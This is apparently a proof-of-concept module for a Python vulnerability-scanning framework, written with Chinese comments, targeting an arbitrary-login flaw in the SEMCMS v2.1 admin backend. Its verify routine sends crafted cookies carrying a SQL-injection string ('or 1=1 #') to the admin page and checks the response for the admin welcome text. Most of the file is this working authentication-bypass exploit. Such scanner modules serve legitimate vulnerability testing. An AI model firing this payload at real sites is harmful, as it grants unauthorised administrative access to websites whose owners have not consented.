# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'SEMCMS_0001'  # 平台漏洞编号，留空
    name = 'SEMCMS v2.1 后台地址任意用户登录'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2017-03-05'  # 漏洞公布时间
    desc = """
        SemCms是一套开源外贸企业网站管理系统,主要用于外贸企业,兼容IE、Firefox 、google、360 等主流浏览器。
        文件位置:/Admin/Include/function.php
        cookie只简单的用htmlspecialchars()函数过滤了。我们知道这个函数用于将'&'，'''(单引号)，'"'（双引号）,'<'(小于号),'>'（大于号）转义为html实体字符。
        过滤不严谨，导致任意用户登录。
    """  # 漏洞描述
    ref = 'http://0day5.com/archives/4320/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'SEMCMS'  # 漏洞应用名称
    product_version = 'v2.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9f3d6cc0-1f41-41f0-9fe4-0c15bcd7402e'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            cookies = {"scuser": "\\", "scuserqx": "or 1=1 #"}
            payload = '/xdan_Admin/SEMCMS_Main.php'
            url = self.target + payload
            r = requests.get(url, cookies=cookies)

            if r.status_code == 200 and '欢迎使用黑蚂蚁' in r.text and '账号密码不正确' not in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
